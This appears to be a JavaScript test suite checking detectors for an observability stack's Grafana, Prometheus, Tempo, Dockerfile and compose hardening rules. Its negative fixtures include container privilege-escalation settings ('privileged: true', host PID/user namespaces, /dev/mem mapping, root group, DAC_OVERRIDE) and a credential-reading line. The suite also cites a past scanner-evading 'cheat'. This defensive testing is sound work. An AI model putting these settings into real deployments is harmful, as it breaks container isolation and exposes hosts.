const DAEMON_WITH_TWO_TIMERS = `${DAEMON_GOOD}\nsetTimeout(() => flush(options), 5000);`;
const DAEMON_TEST_WITH_LISTEN = `${DAEMON_TEST_GOOD}\nserver.listen(9101);`;
const PURE_WITH_NODE_HTTP = `${PURE_GOOD}\nimport { createServer } from 'node:http';`;
const PURE_WITH_NODE_FS = `${PURE_GOOD}\nimport { statSync } from 'node:fs';`;
const DAEMON_WITH_WILDCARD_BIND = `${DAEMON_GOOD}\nconst host = '0.0.0.0';`;
// Assembled: the eval must not itself spell a contiguous scheme separator.
const DAEMON_WITH_SCHEME = `${DAEMON_GOOD}\nconst sink = 'otlp${':'}${'//'}collector';`;
// AM7's executed cheat, verbatim in shape: a promise-API append plus a bulk
// copy. Neither `open(` nor `cpsync` was in WRITE_APIS when this scanned GREEN.
const DAEMON_WITH_OPEN_WRITE = `${DAEMON_GOOD}\nconst fh = await open(options.checkpoint, 'a');\nawait fh.write(doc);`;
const DAEMON_WITH_CP_SYNC = `${DAEMON_GOOD}\ncpSync(options.logsDir, options.spool, { recursive: true });`;
const DAEMON_WITH_CREDENTIAL = `${DAEMON_GOOD}\nconst auth = process.env.MR_RELAY_TOKEN;`;

// ---------------------------------------------------------------------------
// 16r-e fixtures (T-q..T-u). Inline strings only — no fixture file is written.
// Every builder produces the COMPLIANT shape by default so each tooth proves
// its detector ACCEPTS the good shape before proving it rejects the bad one
// (the T-o idiom).
// ---------------------------------------------------------------------------

/** One `- record:` rule in the exact `expr: |` block-scalar shape the real file uses. */
function schedulerRuleLines(o) {
  const matcher = o.names.join('|');
  return [
    `      - record: ${o.name}`,
    '        expr: |',
    `          sum by (${o.aggBy}) (rate(${SCHEDULED_FN_METRIC}{${o.labelKey}=~"${matcher}",le="${o.edge}"}[${o.window ?? '5m'}]))`,
  ];
}

/**
 * The `mr-scheduler` recording-rule group, compliant by default. `o.starts`/
 * `o.onTime`/`o.ratio` are partial overrides merged onto the compliant shape,
 * so each tooth mutates exactly one dimension per call.
 */
function schedulerRecordingDoc(o = {}) {
  const s = {
    labelKey: 'function',
    names: SCHEDULED_FN_NAMES,
    aggBy: 'function',
    edge: '+Inf',
    name: SCHEDULED_STARTS_SERIES,
    omit: false,
    comment: false,
    window: '5m',
    ...o.starts,
  };
  const t = {
    labelKey: 'function',
    names: SCHEDULED_FN_NAMES,
    aggBy: 'function',
    edge: SCHEDULED_DELAY_OVER_EDGE,
    name: SCHEDULED_ON_TIME_SERIES,
    omit: false,
    window: '5m',
    ...o.onTime,
  };
  const r = { name: SCHEDULED_LATE_SERIES, expr: null, omit: false, extraMatcher: false, ...o.ratio };

  const lines = ['groups:', '  - name: mr-scheduler', '    interval: 15s', '    rules:'];
  if (s.omit !== true) {
    const rl = schedulerRuleLines(s);
    if (s.comment === true) lines.push(...rl.map((l) => `      # ${l.trim()}`));
    else lines.push(...rl);
  }
  if (t.omit !== true) lines.push(...schedulerRuleLines(t));
  if (r.omit !== true) {
    lines.push(`      - record: ${r.name}`);
    lines.push('        expr: |');
    const ratioBody =
      r.expr ??
      (r.extraMatcher === true
        ? `1 - (${t.name} / ${s.name}) + 0 * sum by (function) (rate(${SCHEDULED_FN_METRIC}{function=~"${SCHEDULED_FN_NAMES.join('|')}",le="+Inf"}[5m]))`
        : `1 - (${t.name} / ${s.name})`);
    lines.push(`          ${ratioBody}`);
  }
  return lines.join('\n');
}

/**
 * The numbered-provenance comment block above the mr-scheduler group,
 * naming every literal G13e's needles look for, on `#` comment lines.
 */
const SCHEDULER_PROVENANCE_BLOCK = [
  '# PROVENANCE (measured against a live SpacetimeDB 2.8.1 /v1/metrics scrape):',
  '#   (1) the complete spacetime_scheduled_function_delay_seconds_bucket edge list is 0.001,',
  '#       0.005, 0.01, 0.05, 0.1, 0.5, 1, 5, 10, 30, 60, 300, +Inf -- there is no 0.03 edge.',
  '#   (2) p95 on the measured data lands inside (0.001, 0.005]; 158/15186 invocations (1.04%)',
  '#       exceeded 50 ms and 48 exceeded 60 SECONDS -- p95 is blind to the tail.',
  '#   (3) 30 ms is SpacetimeDB\'s OWN late-start `log::warn!` threshold, a DIFFERENT instrument,',
  '#       and is deliberately not a bucket edge.',
].join('\n');

/** The full recording.rules.yml fixture: the provenance block plus the group. */
function schedulerRecordingDocFull(o = {}) {
  const provenance = o.omitProvenance === true ? '' : `${SCHEDULER_PROVENANCE_BLOCK}\n`;
  return `${provenance}${schedulerRecordingDoc(o)}`;
}

/** One provisioned alert group holding exactly the scheduler alert rule. */
function schedulerAlertRulesDoc(o = {}) {
  const lines = ['apiVersion: 1', '', 'groups:'];
  lines.push('  - orgId: 1');
  lines.push('    name: meta-monitoring');
  lines.push('    folder: Monster Realm');
  lines.push(`    interval: ${o.groupInterval ?? '20s'}`);
  lines.push('    rules:');
  lines.push(
    ...alertRuleLines({
      uid: 'mr-alloy-ingest-stalled',
      title: 'AlloyIngestStalled',
      forValue: '10m',
      severity: 'warning',
      expr: 'mr:alloy_log_bytes_read:rate5m',
      datasourceUid: o.stalledDatasourceUid ?? 'mr-prometheus',
    }),
  );
  if (o.omitRule !== true) {
    lines.push(
      ...alertRuleLines({
        uid: o.uid ?? 'mr-scheduled-function-delayed',
        title: 'ScheduledFunctionDelayed',
        forValue: o.forValue ?? '10m',
        expr: SCHEDULED_LATE_SERIES,
        severity: o.severity ?? 'warning',
        evaluatorType: o.evaluatorType ?? 'gt',
        thresholdType: o.thresholdType ?? 'threshold',
        params: o.params ?? [SCHEDULED_ALERT_PARAM_DEFAULT],
        isPaused: o.isPaused,
        datasourceUid: o.datasourceUid ?? 'mr-prometheus',
        condition: o.condition,
        expression: o.expression,
        noDataState: o.omitNoDataState === true ? undefined : (o.noDataState ?? 'OK'),
      }),
    );
  }
  return lines.join('\n');
}

/** The evaluator param this suite treats as the committed literal (0.01 = 1%). */
const SCHEDULED_ALERT_PARAM_DEFAULT = '0.01';

/** The dashboard fixture: N filler panels plus (optionally) the scheduler panel. */
function schedulerDashboardFixture(o = {}) {
  const filler = o.fillerPanels ?? [
    { id: 1, gridPos: { h: 6, w: 24, x: 0, y: 25 }, targets: [{ expr: 'mr:chat_events:rate5m' }] },
  ];
  const panels = [...filler];
  if (o.omitPanel !== true) {
    panels.push({
      id: o.id ?? 14,
      type: 'timeseries',
      title: 'Scheduled-function lateness',
      gridPos: o.gridPos ?? { h: 6, w: 24, x: 0, y: 31 },
      fieldConfig: {
        defaults: {
          unit: o.unit ?? 'percentunit',
          thresholds: {
            mode: 'absolute',
            steps:
              o.steps ??
              [
                { color: 'green', value: null },
                { color: 'red', value: Number(o.thresholdValue ?? SCHEDULED_ALERT_PARAM_DEFAULT) },
              ],
          },
        },
      },
      targets: [
        {
          refId: 'A',
          editorMode: 'code',
          legendFormat: o.legendFormat ?? '{{function}}',
          expr: o.expr ?? SCHEDULED_LATE_SERIES,
        },
      ],
    });
  }
  return JSON.stringify({ panels });
}

const TEETH = [
  {
    id: 'T-a',
    // INVERTED in 13r-b (P1 graduated). Until this slice this tooth asserted
    // that an 8-service compose was REJECTED — the m20e-2 park tripwire. The
    // relay has landed, so the polarity flips, and the tooth's real job is
    // unchanged: kill a service-set check that COUNTS instead of comparing.
    // Both rejection cases keep a count of 8 or a count of 7 that "looks right",
    // which is exactly why set equality is the bar.
    run() {
      const eight = checkServiceSetExact(composeWith(EIGHT_SERVICES), EIGHT_SERVICES);
      if (!eight.ok) return `the committed 8-service shape was rejected: ${eight.detail}`;

      const withoutRelay = EIGHT_SERVICES.filter((n) => n !== RELAY_SERVICE_NAME);
      const seven = checkServiceSetExact(composeWith(withoutRelay), EIGHT_SERVICES);
      if (seven.ok) {
        return 'a 7-service compose with the relay MISSING was accepted — that is the pre-13r-b tree, and it must not read as green now that a scrape job and an alert rule point at that service';
      }
      if (!seven.detail.includes(RELAY_SERVICE_NAME)) {
        return `the missing-relay failure does not name the service: ${seven.detail}`;
      }

      const substituted = checkServiceSetExact(
        composeWith([...withoutRelay, 'datadog']),
        EIGHT_SERVICES,
      );
      if (substituted.ok) {
        return 'an 8-service compose with `datadog` substituted for the relay was accepted — the COUNT is identical, which is the entire reason this is a set comparison';
      }
      if (checkServiceSetExact(composeWith([...EIGHT_SERVICES, 'datadog']), EIGHT_SERVICES).ok) {
        return 'a 9th service riding alongside the expected 8 was accepted';
      }
      return null;
    },
  },
  {
    id: 'T-b',
    // Kills a banned-membership check that only looks for movement_tick, or
    // only for the parsed $slo_set, or only for bench ids.
    run() {
      const banned = [ALWAYS_BANNED_REDUCER, 'move_player', 'apply_move'];
      if (checkBannedMembership([], banned).ok !== true) return 'the empty membership was rejected';
      for (const name of banned) {
        if (checkBannedMembership([name], banned).ok) return `\`${name}\` was accepted as a member`;
      }
      if (checkBannedMembership(['talk', 'apply_move'], banned).ok) {
        return 'a membership containing one legal and one banned name was accepted';
      }
      if (!checkBannedMembership(['talk'], banned).ok) {
        return 'a legal membership was rejected';
      }
      if (checkBannedMembership(['talk'], []).ok) {
        return 'an EMPTY banned set was treated as a pass — nothing could have been excluded';
      }
      return null;
    },
  },
  {
    id: 'T-c',
    // THE tooth that makes the empty-vs-empty equality honest. If the scanner
    // is broken, 0 === 0 is green forever and OBS-50 is unowned.
    run() {
      const detected = pairedReducers({ 'synthetic.rs': SRC_PAIRED });
      if (!detected.paired.includes('synthetic_paired')) {
        return `a reducer body carrying BOTH phase literals was not detected (paired=[${detected.paired.join(', ')}]) — an empty scan result would make G9f vacuously green`;
      }
      const equality = checkExactSetEquality([], detected.paired);
      if (equality.ok) return 'set-equality accepted a detected reducer against an EMPTY config';
      if (!equality.detail.includes('SUBSET')) {
        return `the failure did not report the SUBSET direction: ${equality.detail}`;
      }

      // NEGATIVE CONTROL (AM5): enter in one reducer, exit in another, same
      // file. A file-wide `contains && contains` calls this a pair.
      const split = pairedReducers({ 'split.rs': SRC_SPLIT_ACROSS_REDUCERS });
      if (split.paired.length !== 0) {
        return `enter in one reducer and exit in another registered as paired: [${split.paired.join(', ')}]`;
      }
      if (split.reducersScanned !== 2) {
        return `expected 2 scanned reducer bodies in the split fixture, got ${split.reducersScanned}`;
      }

      // A doc MENTION is not a call site (the 56-vs-53 miscount class).
      const documented = pairedReducers({ 'doc.rs': SRC_DOC_MENTION_ONLY });
      if (documented.paired.length !== 0) {
        return 'a commented-out mention of both literals registered as a paired reducer';
      }

      // The granularity blind spot is REPORTED, never silently dropped.
      const orphan = pairedReducers({ 'helper.rs': SRC_ORPHAN_HELPER });
      if (orphan.paired.length !== 0) return 'a non-reducer helper registered as a paired reducer';
      if (orphan.orphans.length !== 2) {
        return `a phase literal outside every reducer body must be reported as an orphan; got ${orphan.orphans.length}`;
      }

      // And both directions of inequality are distinguishable.
      const superset = checkExactSetEquality(['ghost_reducer'], []);
      if (superset.ok || !superset.detail.includes('SUPERSET')) {
        return `a config naming a reducer with no call site was not reported as a SUPERSET: ${superset.detail}`;
      }
      if (!checkExactSetEquality([], []).ok)
        return 'two genuinely empty sets were reported unequal';
      return null;
    },
  },
  {
    id: 'T-d',
    // Four DISTINCT failures. A loader that returns `[]` for any of them turns
    // "the config is gone" into "no reducers are instrumented".
    run() {
      const absent = readTracePairSet(null);
      const unparseable = readTracePairSet('   ');
      const noSchema = readTracePairSet('{}');
      const noKey = readTracePairSet('{"schema":1}');
      const cases = [absent, unparseable, noSchema, noKey];
      const labels = ['absent', 'blank', '{}', '{"schema":1}'];
      for (let i = 0; i < cases.length; i++) {
        if (cases[i].ok) return `the ${labels[i]} config was accepted`;
        if (typeof cases[i].detail !== 'string' || cases[i].detail.length === 0) {
          return `the ${labels[i]} failure carries no detail`;
        }
      }
      if (new Set(cases.map((c) => c.detail)).size !== 4) {
        return 'the four failure modes are not distinguishable from their details';
      }
      if (absent.stage !== 1 || unparseable.stage !== 2) return 'stages 1 and 2 are mislabelled';
      if (noSchema.stage !== 3 || noKey.stage !== 3) return 'stage 3 is mislabelled';

      const wrongType = readTracePairSet('{"schema":1,"trace_pair_set":"move_player"}');
      if (wrongType.ok) return 'a STRING membership was accepted as an array';
      const wrongSchema = readTracePairSet('{"schema":2,"trace_pair_set":[]}');
      if (wrongSchema.ok) return 'schema 2 was accepted';
      const good = readTracePairSet('{"schema":1,"trace_pair_set":[]}');
      if (!good.ok) return `the committed empty shape was rejected: ${good.detail}`;
      if (good.stage !== 4 || good.names.length !== 0) return 'the good read is mis-shaped';
      const populated = readTracePairSet('{"schema":1,"trace_pair_set":["talk"]}');
      if (!populated.ok || populated.names[0] !== 'talk') return 'a populated read is mis-shaped';
      return null;
    },
  },
  {
    id: 'T-e',
    // Kills file-wide `text.includes('connection_id')`: the string is present
    // in both broken fixtures, in a DIFFERENT key path.
    run() {
      const good = checkTracesToLogsPivot(DS_GOOD);
      if (!good.ok) return `the well-formed pivot fixture was rejected: ${good.detail}`;
      const goodBoth = checkCorrelationBothDirections(DS_GOOD);
      if (!goodBoth.ok) return `the two-direction fixture was rejected: ${goodBoth.detail}`;

      if (!DS_NO_PIVOT_KEY.includes('connection_id')) {
        return 'FIXTURE: the no-pivot fixture must still MENTION connection_id elsewhere';
      }
      if (checkTracesToLogsPivot(DS_NO_PIVOT_KEY).ok) {
        return 'a tracesToLogsV2 whose query does not filter on connection_id was accepted';
      }

      if (!DS_ONE_DIRECTION.includes('connection_id')) {
        return 'FIXTURE: the one-direction fixture must still mention connection_id';
      }
      const oneWay = checkCorrelationBothDirections(DS_ONE_DIRECTION);
      if (oneWay.ok) return 'a single correlation direction was accepted as the pivot';
      if (!oneWay.detail.includes('mr-tempo->mr-loki')) {
        return `the failure did not name the MISSING direction: ${oneWay.detail}`;
      }

      const noDatasources = checkTracesToLogsPivot('apiVersion: 1\n');
      if (noDatasources.ok) return 'a file with no datasources: key was accepted';
      return null;
    },
  },
  {
    id: 'T-f',
    // Kills a matcher parser that returns an empty set on malformed input —
    // which would make G9e's intersection vacuously empty.
    run() {
      const unparseable = parseSloSet(RULES_UNPARSEABLE_MATCHER);
      if (unparseable.ok) return 'an unterminated `reducer=~"` matcher parsed "successfully"';
      const single = parseSloSet('expr: rate(x{reducer=~"move_player"}[5m])');
      if (single.ok) return 'a SINGLE matcher copy was accepted; AM11 requires both to be parsed';
      const agreeing = parseSloSet(RULES_TWO_AGREEING);
      if (!agreeing.ok) return `two agreeing matcher copies were rejected: ${agreeing.detail}`;
      if (agreeing.names.length !== 2) return `parsed ${agreeing.names.length} names, expected 2`;
      const disagreeing = parseSloSet(RULES_TWO_DISAGREEING);
      if (disagreeing.ok) return 'two DISAGREEING matcher copies were accepted (AM11)';
      const none = parseSloSet('groups: []');
      if (none.ok) return 'a rules file with no matcher at all was accepted';

      const ids = benchIds('pub const BUDGETS: &[Budget] = &[];');
      if (ids.ok) return 'a budgets.rs with zero bench ids was accepted';

      // G9c's own teeth, alongside the parse ones.
      const labelled = checkConnectionIdNotALabel(
        ALLOY_LABELS_WITH_CONNECTION_ID,
        RULES_TWO_AGREEING,
      );
      if (labelled.ok) return 'connection_id promoted to a Loki LABEL was accepted';
      const grouped = checkConnectionIdNotALabel(ALLOY_LABELS_BOUNDED, RULES_BY_CONNECTION_ID);
      if (grouped.ok) return 'a recording rule grouping `by (connection_id)` was accepted';
      const clean = checkConnectionIdNotALabel(ALLOY_LABELS_BOUNDED, RULES_TWO_AGREEING);
      if (!clean.ok) return `the clean label/grouping fixture was rejected: ${clean.detail}`;
      const noLabels = checkConnectionIdNotALabel('loki.process "x" { }', RULES_TWO_AGREEING);
      if (noLabels.ok) return 'a config with NO stage.labels block vacuously passed';
      return null;
    },
  },
  {
    id: 'T-g',
    // Non-vacuity of the reader itself: a missing input must throw, not return
    // '' and let every `includes` below report a clean absence.
    run() {
      let threw = false;
      try {
        readReal(`${OPS}/this-file-does-not-exist.yml`);
      } catch (err) {
        threw = true;
        if (!err.message.includes('never green')) {
          return `the reader threw without saying why: ${err.message}`;
        }
      }
      if (!threw) return 'readReal returned normally for a missing file';
      return null;
    },
  },
  {
    id: 'T-h',
    // Kills: a denylist of known-bad tempo flags (cannot catch flag #3); a
    // one-directional subset check; an order-blind set comparison; a detector
    // that passes when the service or its command is absent; a digest/tag-blind
    // park; a park that hides itself with `profiles:`/`restart: "no"`; and — the
    // AM17 tooth — a whole-file service lookup that validates an `x-decoy:`
    // block instead of the real service.
    run() {
      const good = checkTempoCommandParked(tempoCompose());
      if (!good.ok) return `the committed park shape was rejected: ${good.detail}`;

      const removed = checkTempoCommandParked(tempoCompose({ command: [TEMPO_FLAG_CONFIG] }));
      if (removed.ok) return 'the parked flag being REMOVED was accepted';
      if (!removed.detail.includes('SUBSET')) {
        return `the removal was not reported as a SUBSET: ${removed.detail}`;
      }
      for (const needle of ['stack-config-checks.mjs', 'tempo-config.yml']) {
        if (!removed.detail.includes(needle)) {
          return `the SUBSET failure does not name \`${needle}\` in its follow-up prescription: ${removed.detail}`;
        }
      }

      const extra = checkTempoCommandParked(
        tempoCompose({ command: [TEMPO_FLAG_CONFIG, TEMPO_FLAG_LISTEN, '-target=all'] }),
      );
      if (extra.ok) return 'a THIRD, unreviewed tempo flag was accepted';
      if (!extra.detail.includes('SUPERSET')) {
        return `the extra flag was not reported as a SUPERSET: ${extra.detail}`;
      }

      const reordered = checkTempoCommandParked(
        tempoCompose({ command: [TEMPO_FLAG_LISTEN, TEMPO_FLAG_CONFIG] }),
      );
      if (reordered.ok) return 'the right SET of flags in the wrong ORDER was accepted';

      if (checkTempoCommandParked(tempoCompose({ omitCommand: true })).ok) {
        return 'a tempo service with NO `command:` key was accepted';
      }
      if (checkTempoCommandParked(tempoCompose({ omitService: true })).ok) {
        return 'a compose with no `tempo:` service at all was accepted';
      }
      if (checkTempoCommandParked(tempoCompose({ image: 'grafana/tempo:2.11.0' })).ok) {
        return 'a tempo VERSION bump was accepted without re-verifying the flag set';
      }
      if (
        checkTempoCommandParked(tempoCompose({ extraLines: ['    profiles:', '      - parked'] }))
          .ok
      ) {
        return '`profiles:` on tempo was accepted — it removes the service from `docker compose config --services` and the park reads as closed';
      }
      if (
        checkTempoCommandParked(
          tempoCompose({ extraLines: ['    extends:', '      file: base.yml'] }),
        ).ok
      ) {
        return '`extends:` on tempo was accepted — it smuggles arbitrary keys in from an unscanned file';
      }
      if (checkTempoCommandParked(tempoCompose({ restart: '"no"' })).ok) {
        return '`restart: "no"` was accepted — a parked failure that does not restart does not look broken';
      }

      // AM17: the decoy is COMPLIANT and sits where a whole-file `findIndex`
      // would find it first; the real `services:` tempo has lost the parked
      // flag. A detector that is not scoped to `services:` reports green here.
      const decoyText = tempoCompose({ decoy: true, command: [TEMPO_FLAG_CONFIG] });
      if (decoyText.indexOf('x-decoy:') > decoyText.indexOf('services:')) {
        return 'FIXTURE: the decoy must sit BEFORE `services:` to shadow a whole-file search';
      }
      const decoy = checkTempoCommandParked(decoyText);
      if (decoy.ok) {
        return 'a top-level `x-decoy:` block holding a compliant `tempo:` shadowed the real, non-compliant service';
      }
      if (!decoy.detail.includes('SUBSET')) {
        return `the decoy fixture failed for the wrong reason: ${decoy.detail}`;
      }
      return null;
    },
  },
  {
    id: 'T-i',
    // Kills: a rules.yml-only scan (Grafana provisions the whole directory); a
    // `% 10 === 0` divisibility check with no non-zero clause; a `for:` clause
    // that coerces or skips an unparseable value; a group-count-blind scan; and
    // a file set that silently widens.
    run() {
      const tag = GRAFANA_IMAGE_TAG;
      const good = checkAlertGroupIntervals(alertingDocsFixture(), tag);
      if (!good.ok) return `the compliant 20s/60s fixture was rejected: ${good.detail}`;

      // `for: 0s` is LEGAL and meaningful — Grafana fires on the first
      // evaluation. A "for must be non-zero" clause would be wrong.
      const zeroFor = checkAlertGroupIntervals(
        alertingDocsFixture({ rules: alertRulesDoc({ forValue: '0s' }) }),
        tag,
      );
      if (!zeroFor.ok) return `\`for: 0s\` was rejected, but it is legal: ${zeroFor.detail}`;
      const noFor = checkAlertGroupIntervals(
        alertingDocsFixture({ rules: alertRulesDoc({ omitFor: true }) }),
        tag,
      );
      if (!noFor.ok) return `a rule with no \`for:\` at all was rejected: ${noFor.detail}`;

      const bad15 = checkAlertGroupIntervals(
        alertingDocsFixture({ rules: alertRulesDoc({ interval: '15s' }) }),
        tag,
      );
      if (bad15.ok)
        return 'the committed `interval: 15s` (which crashes grafana at boot) was accepted';
      if (!bad15.detail.includes('scheduler')) {
        return `the 15s failure does not name the scheduler tick: ${bad15.detail}`;
      }

      const zero = checkAlertGroupIntervals(
        alertingDocsFixture({ rules: alertRulesDoc({ interval: '0s' }) }),
        tag,
      );
      if (zero.ok) return '`interval: 0s` was accepted — 0 passes a bare `% 10 === 0` test';

      const drift = checkAlertGroupIntervals(
        alertingDocsFixture({ rules: alertRulesDoc({ interval: '20s', forValue: '45s' }) }),
        tag,
      );
      if (drift.ok)
        return '`for: 45s` under a 20s interval was accepted — the YAML lies about its own behaviour';
      for (const needle of ['REPO CONVENTION', 'ADR-0190', '60s']) {
        if (!drift.detail.includes(needle)) {
          return `the \`for\`-drift failure is missing \`${needle}\` (it must not read as a Grafana rule, and must print the effective value): ${drift.detail}`;
        }
      }

      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ interval: 'twenty' }) }),
          tag,
        ).ok
      ) {
        return 'an unparseable `interval: twenty` was accepted — it must fail LOUD, never be skipped';
      }
      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ forValue: '45' }) }),
          tag,
        ).ok
      ) {
        return 'a unit-less `for: 45` was accepted — it must fail loud, never be coerced to seconds';
      }
      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ secondInterval: '15s' }) }),
          tag,
        ).ok
      ) {
        return 'a group with TWO `interval:` keys was accepted — YAML takes the last, so the first is a lie';
      }
      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ omitInterval: true }) }),
          tag,
        ).ok
      ) {
        return 'a group with NO `interval:` was accepted — grafana would silently apply its own default';
      }
      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ emptyGroups: true }) }),
          tag,
        ).ok
      ) {
        return 'a `groups:` key with zero groups was accepted — nothing was scanned';
      }
      if (
        checkAlertGroupIntervals(
          alertingDocsFixture({ rules: alertRulesDoc({ emptyRules: true }) }),
          tag,
        ).ok
      ) {
        return 'a group with `rules: []` was accepted — nothing was scanned';
      }

      // AM19: the SIBLING document. rules.yml itself is compliant, so a
      // rules.yml-only detector reports green while grafana refuses to boot.
      const siblingDocs = alertingDocsFixture({
        notificationPolicies: alertRulesDoc({ groupName: 'smuggled', interval: '15s' }),
      });
      const primary = siblingDocs.find((d) => d.name === 'rules.yml');
      if (!checkAlertGroupIntervals(alertingDocsFixture({ rules: primary.text }), tag).ok) {
        return 'FIXTURE: the sibling case requires rules.yml itself to be compliant';
      }
      const sibling = checkAlertGroupIntervals(siblingDocs, tag);
      if (sibling.ok) return 'a BAD group in a sibling provisioned document was not scanned at all';
      if (!sibling.detail.includes('notification-policies.yml')) {
        return `the sibling failure does not name the offending document: ${sibling.detail}`;
      }

      const extraFile = checkAlertGroupIntervals(
        [...alertingDocsFixture(), { name: 'rules-extra.yml', text: alertRulesDoc() }],
        tag,
      );
      if (extraFile.ok)
        return 'an unexpected extra document in the alerting directory was accepted';
      if (!extraFile.detail.includes('rules-extra.yml')) {
        return `the file-set failure does not name the new file: ${extraFile.detail}`;
      }

      if (checkAlertGroupIntervals([], tag).ok) return 'ZERO alerting documents was accepted';
      if (checkAlertGroupIntervals(alertingDocsFixture(), null).ok) {
        return 'a missing grafana image string was accepted — the 10s tick is image-dependent';
      }
      if (checkAlertGroupIntervals(alertingDocsFixture(), 'grafana/grafana:14.0.0').ok) {
        return 'a grafana MAJOR version bump was accepted without re-verifying the scheduler tick';
      }
      return null;
    },
  },
  {
    id: 'T-j',
    // Kills an index-aware `.includes('setcap -r')` check: BOTH bypasses below
    // keep the setcap textually before `USER` and still ship a binary that
    // cannot exec under `--cap-drop ALL` (measured: exit 255).
    run() {
      const good = checkCaddySetcapBeforeUser(dockerfileFixture());
      if (!good.ok) return `the fixed Dockerfile shape was rejected: ${good.detail}`;

      if (checkCaddySetcapBeforeUser(dockerfileFixture({ tail: ['USER 10001:10001'] })).ok) {
        return 'a Dockerfile with NO setcap was accepted (this is the committed state)';
      }
      if (
        checkCaddySetcapBeforeUser(
          dockerfileFixture({ tail: ['USER 10001:10001', 'RUN setcap -r /usr/bin/caddy'] }),
        ).ok
      ) {
        return 'a setcap placed AFTER `USER` was accepted — that Dockerfile does not even build';
      }
      if (
        checkCaddySetcapBeforeUser(
          dockerfileFixture({ tail: ['# RUN setcap -r /usr/bin/caddy', 'USER 10001:10001'] }),
        ).ok
      ) {
        return 'a setcap that exists only inside a `#` comment was accepted';
      }
      if (
        checkCaddySetcapBeforeUser(
          dockerfileFixture({
            tail: [
              'RUN setcap -r /usr/bin/caddy',
              `RUN setcap cap_net_${'bind'}_service=+ep /usr/bin/caddy`,
              'USER 10001:10001',
            ],
          }),
        ).ok
      ) {
        return 'the capability being RE-ADDED after the strip was accepted';
      }
      if (
        checkCaddySetcapBeforeUser(dockerfileFixture({ tail: ['RUN setcap -r /usr/bin/caddy'] })).ok
      ) {
        return 'a final stage with NO `USER` was accepted — the container runs as root';
      }
      if (
        checkCaddySetcapBeforeUser(
          dockerfileFixture({
            tail: ['RUN setcap -r /usr/bin/caddy', 'USER 10001:10001', 'USER root'],
          }),
        ).ok
      ) {
        return 'a trailing `USER root` was accepted — it undoes everything the first USER bought';
      }

      // AM18a: the setcap runs in a stage the final image DISCARDS.
      const builderOnly = dockerfileFixture({ builderSetcap: true, tail: ['USER 10001:10001'] });
      if (!builderOnly.includes('setcap -r /usr/bin/caddy')) {
        return 'FIXTURE: the builder-stage bypass must still spell the setcap verbatim';
      }
      const staged = checkCaddySetcapBeforeUser(builderOnly);
      if (staged.ok)
        return 'a setcap in an earlier `AS builder` stage was accepted — the final image discards that filesystem';
      if (!staged.detail.includes('EARLIER stage')) {
        return `the discarded-stage failure does not say which stage ran it: ${staged.detail}`;
      }

      // AM18b: buildkit PRESERVES file capabilities across `COPY --from=`, so a
      // later copy re-adds what the setcap removed — textual order is not enough.
      const lateCopy = checkCaddySetcapBeforeUser(
        dockerfileFixture({
          tail: [
            'RUN setcap -r /usr/bin/caddy',
            'COPY --from=builder /usr/bin/caddy /usr/bin/caddy',
            'USER 10001:10001',
          ],
        }),
      );
      if (lateCopy.ok) {
        return 'a `COPY --from=` of /usr/bin/caddy AFTER the setcap was accepted — the capability rides back in with the file';
      }
      if (!lateCopy.detail.includes('COPY --from=')) {
        return `the late-copy failure does not name the mechanism: ${lateCopy.detail}`;
      }

      if (
        checkCaddySetcapBeforeUser(
          dockerfileFixture({
            tail: ['RUN setcap -r /usr/bin/caddy', 'USER 10001:10001', 'ONBUILD RUN echo hi'],
          }),
        ).ok
      ) {
        return 'an `ONBUILD` instruction was accepted — its child build is invisible to this scan';
      }
      if (checkCaddySetcapBeforeUser('RUN setcap -r /usr/bin/caddy\nUSER 10001:10001\n').ok) {
        return 'a Dockerfile with no `FROM` at all was accepted — the stage structure is unreadable';
      }
      return null;
    },
  },
  {
    id: 'T-k',
    // Kills a four-property checklist. `privileged: true` alone passes "user +
    // cap_drop + security_opt + no cap_add" and restores the full bounding set
    // (measured: CapBnd 000001ffffffffff vs 0000000000000000, 185 host /dev
    // entries vs 15). Also kills a file-wide `includes('user:')`.
    run() {
      const good = checkAlloyRunsUnprivileged(alloyCompose());
      if (!good.ok) return `the fixed alloy block was rejected: ${good.detail}`;

      if (checkAlloyRunsUnprivileged(alloyCompose({ omitUser: true })).ok) {
        return 'an alloy block with no `user:` was accepted (this is the committed state)';
      }
      if (checkAlloyRunsUnprivileged(alloyCompose({ user: '0:0' })).ok) {
        return '`user: "0:0"` was accepted — uid 0 is root however it is spelled';
      }
      if (checkAlloyRunsUnprivileged(alloyCompose({ user: 'alloy' })).ok) {
        return 'a NAME-shaped `user:` was accepted — an image rebuild can renumber it silently';
      }
      if (
        checkAlloyRunsUnprivileged(
          alloyCompose({ extraLines: ['    cap_add:', '      - DAC_OVERRIDE'] }),
        ).ok
      ) {
        return '`cap_add: DAC_OVERRIDE` alongside a correct `user:` was accepted';
      }
      if (checkAlloyRunsUnprivileged(alloyCompose({ omitCapDrop: true })).ok) {
        return 'an alloy block with `cap_drop: - ALL` REMOVED was accepted';
      }
      if (checkAlloyRunsUnprivileged(alloyCompose({ omitSecurityOpt: true })).ok) {
        return 'an alloy block with `no-new-privileges:true` removed was accepted';
      }
      if (
        checkAlloyRunsUnprivileged(
          alloyCompose({ securityOpt: ['no-new-privileges:true', 'seccomp=unconfined'] }),
        ).ok
      ) {
        return 'an EXTRA security_opt item riding beside the correct one was accepted';
      }

      // Block scoping: the string `user:` is present in the file, on the WRONG
      // service. A file-wide substring check reports green (the T-e blind spot).
      const wrongBlock = alloyCompose({ omitUser: true, prometheusUser: '65534:65534' });
      if (!wrongBlock.includes('user: "65534:65534"')) {
        return 'FIXTURE: the scoping case must still spell a `user:` key somewhere in the file';
      }
      if (checkAlloyRunsUnprivileged(wrongBlock).ok) {
        return 'a `user:` on the PROMETHEUS block satisfied the alloy check';
      }

      // The key allowlist. Each of these passes a four-property checklist.
      const smuggled = [
        ['    privileged: true'],
        ['    group_add: ["0"]'],
        ['    pid: host'],
        ['    ipc: host'],
        ['    userns_mode: host'],
        ['    extends:', '      file: base.yml'],
        ['    entrypoint: /bin/sh'],
        ['    devices:', '      - /dev/mem:/dev/mem'],
      ];
      for (const extraLines of smuggled) {
        const key = extraLines[0].trim().split(':')[0];
